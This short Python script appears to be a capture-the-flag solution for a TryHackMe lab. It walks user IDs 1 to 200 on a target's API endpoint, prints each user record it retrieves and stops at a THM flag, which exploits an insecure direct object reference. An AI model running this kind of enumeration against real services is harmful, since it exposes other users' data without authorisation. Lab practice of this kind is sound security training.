import requests
import re

BASE_URL = "http://MACHINE_IP:5002/api/user/{}"

flag_pattern = re.compile(r"THM\{.*?\}")

for user_id in range(1, 201):
    url = BASE_URL.format(user_id)

    try:
        response = requests.get(url, timeout=5)

        if response.status_code == 200:
            text = response.text

            # Check for a THM flag
            match = flag_pattern.search(text)
            if match:
                print(f"[+] Flag found for user {user_id}: {match.group()}")
                break

            print(f"[{user_id}] {text}")

    except requests.RequestException as e:
        print(f"[-] Error with user {user_id}: {e}")
